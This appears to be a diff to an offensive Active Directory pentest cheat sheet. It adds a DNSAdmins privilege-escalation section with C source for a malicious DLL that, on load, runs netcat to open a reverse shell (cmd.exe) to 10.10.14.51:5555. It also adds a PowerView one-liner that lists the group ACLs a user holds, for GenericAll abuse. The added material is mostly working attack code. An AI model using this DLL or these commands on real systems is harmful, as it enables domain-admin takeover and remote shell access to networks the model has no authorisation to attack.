@@ -218,6 +218,32 @@ Get-NetGroupMember -GroupName "DNSAdmins"
 Get-ADGroupMember -Identity DNSAdmins
 ```
 
+*This attack consists of injecting a malicious arbitrary DLL and restarting the dns.exe service, 
+since the DC serves as a DNS service, we can elevate our privileges to a DA.*
+
+> DLL File :
+```c
+#include "stdafx.h"
+#include <stdlib.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.51 5555");
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+```
+
 
 ## Lateral Mouvement
 
@@ -387,6 +413,12 @@ the value "20000" in lookupsid is to indicate how many RID will be tested
 
 ### GenericAll
 
+**list all groups to which the user belongs and has explicit access rights**
+```
+Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
+$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
+$("$env:UserDomain\$env:Username")) {$_}}
+```
 
 ## Enhanced Security Bypass
 
@@ -547,7 +579,6 @@ Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,U
 ### Golden SAML
 
 
-<iframe title="vimeo-player" src="https://player.vimeo.com/video/501769334?h=cd7777e8ab" width="640" height="360" frameborder="0" allowfullscreen></iframe>
 
 ### PassTheCRT
 
